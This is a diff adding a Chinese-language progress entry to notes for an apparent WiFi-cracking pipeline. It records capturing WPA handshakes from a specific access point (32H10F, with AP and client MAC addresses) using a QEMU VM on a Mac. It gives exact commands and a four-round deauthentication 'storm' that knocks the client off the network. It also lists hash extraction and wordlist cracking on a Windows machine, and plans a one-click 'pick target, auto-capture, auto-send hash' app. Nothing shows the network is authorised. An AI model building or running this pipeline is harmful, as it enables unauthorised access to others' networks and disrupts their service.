@@ -19,6 +19,20 @@ Mac 抓 EAPOL (monitor mode)  →  hcxpcapngtool  →  .hc22000 (m=22000 hash)
 - **Windows cracker**: `windows_cracker_app.py` (port 8766)。POST `/api/receive-hash {hash,ssid,bssid}` → 存 hash + 自動開跑；詞表階梯 wifi_wordlist → +best66 → rockyou+best66 → hybrid。
 - **Mac capture**: 需要一個能進 **monitor mode** 的**第二個** WiFi 介面。
 
+## ⏱ 2026-09-13 ✅ VM 抓包管線實測成功（可攜式 Mac 方案驗證）
+- **結論：可以帶 Mac 出門抓封包** ✅ — QEMU VM (Alpine netboot lts) + DWA-160 完整管線實測成功，拿到新 EAPOL。
+- **關鍵發現 / 踩坑**：
+  - DWA-160 實際 chip = **RT5592**（非 5572），USB `148f:5572`，直接掛 AppleT8112USBXHCI（`-device qemu-xhci` + `usb-host vendorid=0x148f productid=0x5572`）。
+  - 自製 initramfs：netboot lts kernel + 9 個 rt2x00 .ko + modloop 的 `modules.dep.bin`（618KB，kmod 優先讀 .bin）+ **rt2870.bin 韌體**（modloop `modules/firmware/rt2870.bin.zst`，zstd 解開放 `/usr/lib/firmware/`）。
+  - **monitor 模式關鍵坑**：`iw dev wlan0 set channel 1` 在 rt2800usb monitor 下報 `Resource busy`，且 `iw scan` 0 結果（rx=0）；但 **managed 模式 scan 正常看到 32H10F** → 改用 **`airodump-ng --channel 1`**（用 iwconfig 頻道機制，有效！15s 抓到 834 封包）。
+  - 工具：`apk add aircrack-ng tcpdump build-base git libpcap-dev openssl-dev zlib-dev`（main+community）+ **編譯 hcxtools**（`git clone ZerBea/hcxtools && make` → `hcxpcapngtool 7.1.2`；hcxdumptool/hcxtools **不在任何 Alpine repo**）。
+  - 網路：靜態 IP `10.0.2.15` + gw `10.0.2.2` + DNS `1.1.1.1`（slirp DHCP 不穩）；clock 要 `date -s`（initramfs 時鐘卡 Jan 1 會導致 TLS 證 not yet valid）。
+  - deauth：`aireplay-ng --deauth --ignore-negative-one`（rt2800 monitor 回報 channel -1）。
+- **實測結果**（32H10F, ch1/2412MHz）：airodump-ng 15s = 834 封包（283 幀目標 AP bc:3e:07:01:dc:98 + 166 幀 client e6:89:4c:90:cd:ed）；完整 4 輪 deauth 風暴（25+25+20/輪）→ **3.7MB capture → EAPOL M1:61 / M3:3、PMKID:61** → hcxpcapngtool → **`captures/mac_vm_capture.22000`**（2 PMKID + 1 **新 EAPOL 90b8d132**）。hashcat self-test **3/3 解析通過**。
+- **新 EAPOL 90b8d132 已合併進 `captures/hs.22000`（現 6 hash：3 PMKID + 3 EAPOL）**。
+- **VM 指令**（Mac 125）：`/opt/homebrew/bin/qemu-system-aarch64 -machine virt -cpu cortex-a72 -m 4096 -smp 4 -drive file=/tmp/alpine-disk.qcow2,format=qcow2 -kernel /tmp/alpine-boot/boot/vmlinuz-lts -initrd /tmp/initramfs-wifi -append 'console=ttyAMA0' -chardev socket,id=s0,path=/tmp/vm_ser.sock,server=on,wait=off -serial chardev:s0 -netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 -device virtio-net-device,netdev=n0 -device qemu-xhci,id=xhci -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 -display none`
+- **待做**：持久化 Alpine 到 qcow2 + 啟 sshd（port 2222 hostfwd）+ 建 **Mac GUI app**（雙擊 → 選目標 → 自動抓包 → 自動回傳 hash 給 Windows:8766）。目前抓包靠 serial + agent SSH 手動控制。
+
 ## ⏱ 2026-09-12 EAPOL 抓包 bug 修復 + 工作中的 capture recipe (32H10F, ch1)
 
 ### 🐛 找到的 bug（關鍵）
